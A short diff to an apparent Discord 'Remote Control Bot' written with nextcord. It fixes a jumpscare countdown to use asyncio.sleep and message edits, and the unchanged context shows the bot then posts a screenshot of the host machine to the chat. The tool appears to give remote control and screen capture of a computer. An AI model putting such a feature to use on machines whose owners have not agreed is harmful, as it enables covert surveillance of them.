@@ -752,9 +752,11 @@ async def jumpscare(interaction: nextcord.Interaction):
         print("Activating jumpscare...")
         jumpscaring = True
         n = 10
+        await interaction.response.send_message(f"Starting {n} second jumpscare countdown...")
+        await asyncio.sleep(1)
         while not n == 0:
-            await interaction.response.send_message(f"Jumpscare activating in {n} seconds...")
-            time.sleep(1)
+            await interaction.edit_original_message(f"Jumpscare activating in {n} seconds...")
+            await asyncio.sleep(1)
             if not jumpscaring:
                 await interaction.edit_original_message(content="Jumpscare cancelled.")
                 print("Jumpscare cancelled")
@@ -784,7 +786,7 @@ async def jumpscare(interaction: nextcord.Interaction):
         embed.set_image(url=f"attachment://status.png")
         embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
-        time.sleep(1)
+        await asyncio.sleep(1)
 
         await interaction.send(embed=embed, file=file)
         print("Screenshot sent")
